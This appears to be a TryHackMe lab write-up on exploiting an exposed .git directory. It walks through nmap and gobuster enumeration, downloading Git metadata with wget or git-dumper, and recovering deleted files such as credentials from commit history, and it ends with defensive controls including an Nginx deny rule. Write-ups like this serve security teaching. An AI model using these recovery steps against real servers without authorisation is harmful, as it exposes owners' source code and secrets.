# TryHackMe — Room 404

## Overview

**Platform:** TryHackMe  
**Category:** Web Security / Source-Code Exposure  
**Core techniques:** directory enumeration, exposed Git metadata, repository reconstruction, historical-file recovery

Room 404 demonstrates a deployment mistake with disproportionate impact: publishing the application's `.git` directory alongside the website.

The visible site may contain little useful information, while the Git object database exposes source code, history, deleted files, and developer metadata.

Flags are intentionally excluded.

## Attack Chain

```text
Web service discovery
      ↓
Content enumeration
      ↓
Exposed /.git/
      ↓
Git metadata download
      ↓
Repository reconstruction
      ↓
Commit/history inspection
      ↓
Deleted internal content recovered
```

## 1. Service Enumeration

Identify the web service:

```bash
nmap -sC -sV -p 8080 <TARGET_IP>
```

Then inspect it manually:

```bash
curl -i http://<TARGET_IP>:8080/
```

Check:

- page source
- robots.txt
- JavaScript paths
- response headers
- hidden directories
- dotfiles

## 2. Directory Enumeration

Use a content-discovery wordlist:

```bash
gobuster dir   -u http://<TARGET_IP>:8080/   -w /usr/share/seclists/Discovery/Web-Content/common.txt
```

The important finding is an exposed Git control directory.

Verify specific files rather than relying on directory listing:

```bash
curl -i http://<TARGET_IP>:8080/.git/HEAD
curl -i http://<TARGET_IP>:8080/.git/config
```

A readable `.git/HEAD` strongly suggests repository metadata is web-accessible.

## 3. Why an Exposed .git Directory Matters

A Git repository contains much more than the current source tree.

Important paths include:

```text
.git/HEAD
.git/config
.git/index
.git/refs/
.git/logs/
.git/objects/
```

The `objects` directory may contain:

- blobs (file contents)
- trees (directory structure)
- commits
- tags

If enough objects can be downloaded, the working tree can be reconstructed.

## 4. Repository Recovery

In an authorized lab, one option is a recursive fetch:

```bash
wget -r -np -R 'index.html*'   http://<TARGET_IP>:8080/.git/
```

A purpose-built tool such as `git-dumper` can automate object recovery:

```bash
git-dumper   http://<TARGET_IP>:8080/.git/   dumped_repo
```

Once recovered:

```bash
cd dumped_repo
git status
git log --all --oneline --decorate
```

## 5. Restore and Inspect the Working Tree

If only Git metadata was downloaded, Git can often rebuild the tracked files:

```bash
git reset --hard HEAD
```

Review:

```bash
find . -maxdepth 2 -type f -not -path './.git/*'
```

Then inspect commit history:

```bash
git log --all --name-status
git show <COMMIT_SHA>
```

## 6. Recover Deleted Files

A file removed from the latest commit may still exist in earlier commits.

Find history for a path:

```bash
git log --all -- <PATH>
```

Recover an old version:

```bash
git show <COMMIT_SHA>:<PATH>
```

This is a common source of:

- deleted credentials
- internal README files
- API keys
- configuration files
- previous endpoints
- developer notes

## 7. Git Object Model

The reason recovery works is Git's content-addressed design.

```text
commit
  ↓
tree
  ↓
blob
```

Deleting a file in a later commit does not delete the blob referenced by older commits.

Only rewriting history and removing reachable references can actually make the old content unreachable through normal Git history.

## 8. Real-World Impact

An exposed repository may reveal:

- application source
- backend routes
- internal documentation
- database connection strings
- API credentials
- old vulnerabilities
- private hostnames
- CI/CD files
- deleted secrets

Even if no secret is present, source disclosure dramatically improves an attacker's understanding of the application.

## 9. Defensive Controls

### Deployment hygiene

Do not copy development directories directly into the web root.

Use CI/CD to publish only build artifacts.

### Server-side deny rules

Example Nginx defense-in-depth:

```nginx
location ~ /\.git {
    deny all;
    return 404;
}
```

Also deny other sensitive dotfiles where appropriate.

### Secret response

If `.git` was publicly reachable:

1. assume all repository history was downloaded;
2. rotate exposed secrets;
3. remove the directory;
4. review access logs;
5. scan repository history for credentials;
6. rewrite history if sensitive content must be removed.

## Lessons Learned

Room 404 demonstrates a simple but critical deployment rule:

> Source-control metadata is not application content.

A clean-looking production page does not matter if the entire repository history is reachable underneath it.

## References

- TryHackMe Room 404: https://tryhackme.com/room/hh-room404-804573bf
